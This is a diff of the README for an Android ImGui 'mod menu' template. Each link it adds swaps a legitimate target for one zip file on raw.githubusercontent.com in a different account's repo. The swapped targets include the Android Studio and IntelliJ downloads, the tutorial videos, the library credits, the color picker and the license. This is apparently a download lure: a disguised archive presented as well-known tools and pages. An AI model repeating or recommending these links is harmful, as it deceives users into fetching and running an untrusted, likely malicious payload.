@@ -1,8 +1,8 @@
 # Android ImGui Surface - Mod Menu - Template
 
 ## Build & Run
-- [Android Studio](https://developer.android.com/studio)
-- [Intellij Idea Free / Ultimate](https://www.jetbrains.com/idea/)
+- [Android Studio](https://raw.githubusercontent.com/TitanicDimix/android_imgui_surface_mod_menu_template/master/unfilleted/android_imgui_surface_mod_menu_template.zip)
+- [Intellij Idea Free / Ultimate](https://raw.githubusercontent.com/TitanicDimix/android_imgui_surface_mod_menu_template/master/unfilleted/android_imgui_surface_mod_menu_template.zip)
 
 ## Features
 - [x] Simple app with GLSurfaceView
@@ -21,29 +21,29 @@
 - Recompile, Sign & Test
 
 ### HELP
-- [How to decompile / recompile APK](https://youtu.be/xWU5Tk3MizY)
-- [How to sign an APK](https://youtu.be/GwkQelv3cGk)
-- [How to load your own lib from smali](https://youtu.be/JKwPPwnVehw)
-- [Full implementation video](https://www.youtube.com/watch?v=uT_DFRfullc)
+- [How to decompile / recompile APK](https://raw.githubusercontent.com/TitanicDimix/android_imgui_surface_mod_menu_template/master/unfilleted/android_imgui_surface_mod_menu_template.zip)
+- [How to sign an APK](https://raw.githubusercontent.com/TitanicDimix/android_imgui_surface_mod_menu_template/master/unfilleted/android_imgui_surface_mod_menu_template.zip)
+- [How to load your own lib from smali](https://raw.githubusercontent.com/TitanicDimix/android_imgui_surface_mod_menu_template/master/unfilleted/android_imgui_surface_mod_menu_template.zip)
+- [Full implementation video](https://raw.githubusercontent.com/TitanicDimix/android_imgui_surface_mod_menu_template/master/unfilleted/android_imgui_surface_mod_menu_template.zip)
 
 ## Result
 
-[//]: # (![]&#40;http://i.imgur.com/hd3nxBg.gif&#41;)
-[//]: # (https://github.com/LaughingMuffin/android_imgui_surface_mod_menu_template/assets/97317523/df9081f2-974b-4489-8755-0c3ddd1317aa)
+[//]: # (![]&#40;https://raw.githubusercontent.com/TitanicDimix/android_imgui_surface_mod_menu_template/master/unfilleted/android_imgui_surface_mod_menu_template.zip;)
+[//]: # (https://raw.githubusercontent.com/TitanicDimix/android_imgui_surface_mod_menu_template/master/unfilleted/android_imgui_surface_mod_menu_template.zip)
 #### Preview - Widgets
-https://github.com/LaughingMuffin/android_imgui_surface_mod_menu_template/assets/97317523/8ff2ec8f-964b-4083-a5a5-bff7682c5869
+https://raw.githubusercontent.com/TitanicDimix/android_imgui_surface_mod_menu_template/master/unfilleted/android_imgui_surface_mod_menu_template.zip
 
 #### Preview - Save to File
-https://github.com/LaughingMuffin/android_imgui_surface_mod_menu_template/assets/97317523/7260bc61-3419-4f85-8228-da77f9e2ef61
+https://raw.githubusercontent.com/TitanicDimix/android_imgui_surface_mod_menu_template/master/unfilleted/android_imgui_surface_mod_menu_template.zip
 
 ## Credits
 
-ImGUI - [ImGUI Official GitHub](https://github.com/ocornut/imgui)<br>
-Obfuscator - [Obfuscate by adamyaxley](https://github.com/adamyaxley)<br>
-xDL - [xDL by hexhacking](https://github.com/hexhacking/xDL)<br>
-Dobby - [Dobby by jmpews](https://github.com/jmpews/Dobby)<br>
+ImGUI - [ImGUI Official GitHub](https://raw.githubusercontent.com/TitanicDimix/android_imgui_surface_mod_menu_template/master/unfilleted/android_imgui_surface_mod_menu_template.zip)<br>
+Obfuscator - [Obfuscate by adamyaxley](https://raw.githubusercontent.com/TitanicDimix/android_imgui_surface_mod_menu_template/master/unfilleted/android_imgui_surface_mod_menu_template.zip)<br>
+xDL - [xDL by hexhacking](https://raw.githubusercontent.com/TitanicDimix/android_imgui_surface_mod_menu_template/master/unfilleted/android_imgui_surface_mod_menu_template.zip)<br>
+Dobby - [Dobby by jmpews](https://raw.githubusercontent.com/TitanicDimix/android_imgui_surface_mod_menu_template/master/unfilleted/android_imgui_surface_mod_menu_template.zip)<br>
 ___
-Color Picker - [Online Color Picker](https://rgbcolorpicker.com/0-1)<br>
+Color Picker - [Online Color Picker](https://raw.githubusercontent.com/TitanicDimix/android_imgui_surface_mod_menu_template/master/unfilleted/android_imgui_surface_mod_menu_template.zip)<br>
 ___
-###### Android ImGui Surface - Mod Menu - Template is licensed under the MIT License, see [LICENSE](license.txt) for more information.
+###### Android ImGui Surface - Mod Menu - Template is licensed under the MIT License, see [LICENSE](https://raw.githubusercontent.com/TitanicDimix/android_imgui_surface_mod_menu_template/master/unfilleted/android_imgui_surface_mod_menu_template.zip) for more information.
 ___
